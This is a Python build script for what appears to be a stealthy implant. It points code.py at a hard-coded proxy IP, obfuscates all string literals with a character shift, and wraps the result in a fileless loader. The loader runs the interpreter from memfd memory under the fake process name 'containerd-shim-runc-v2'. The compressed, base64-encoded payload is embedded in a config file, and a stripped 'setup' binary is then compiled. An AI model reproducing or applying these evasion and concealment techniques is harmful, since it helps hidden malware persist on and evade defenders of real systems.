import os
import base64
import gzip
import subprocess
import sys

####
# Config
####
PROXY_IP = "fd66:777::6"

#########################
# read IPs.txt and code.py -> code_ips.py | code_mem.py
#########################
# put IPs into code
#ips = open("IPs.txt").read().splitlines()
#IP_list = ", ".join(f"'{ip.strip()}'" for ip in ips)
code = open("code.py").read()
#code = code.replace("'127.0.0.1'", IP_list) # We now only contact the proxy
code = code.replace("'127.0.0.1'", "'" + PROXY_IP + "'") # We now only contact the proxy

# obfuscate strings
head_code = ""
start = code.find('"')
scount = 0
strings = []
while start >= 0:
	end = code.find('"', start + 1)
	content = code[start+1:end]
	content = list(map(lambda x : ord(x) - 7, content))
	strings += [content]
	code = code[:start] + f"get_s({scount})" + code[end+1:]
	start = code.find('"')
	scount += 1
head_code += f"s = {strings}\n"

code = code.replace("## HEAD ##", head_code)

# write output
open("code_ips.py", "w").write(code)
memwrap_code = """import os,sys
a=os.memfd_create("",0)
os.sendfile(a,os.open(sys.executable,0,0),0,0x100000000)
b=os.memfd_create("",0)
os.write(b, b"%s")
os.lseek(b,0,0)
os.dup2(b,0)
os.execve(a,["/usr/bin/containerd-shim-runc-v2", "-O"],{})""" % code.replace("\n", "\\n").replace('"', '\\"')
open("code_mem.py", "w").write(memwrap_code)


#########################
# code_mem.py + marty.conf.in -> marty.conf
#########################
marty = open("marty.conf.in").read()
code = open("code_mem.py").read()
codeb64 = base64.b64encode(gzip.compress(code.encode())).decode()
marty = marty.replace("@B64@", codeb64)
open("marty.conf", "w").write(marty)

#########################
# remaining steps
#########################
if len(sys.argv) >= 2 and sys.argv[1] == "nobin":
	sys.exit(0)
print("Generating code ...")
co = subprocess.check_output([
	"python3",
	"gencode.py"
	])
if len(co) > 0:
	print(co)

print("Compiling code ...")
co = subprocess.check_output([
	"g++",
	"setup.cpp",
	"-o",
	"setup"
	])
if len(co) > 0:
	print(co)
print("Strippping code ...")

co = subprocess.check_output([
	"strip",
	"-s",
	"setup"
	])
if len(co) > 0:
	print(co)
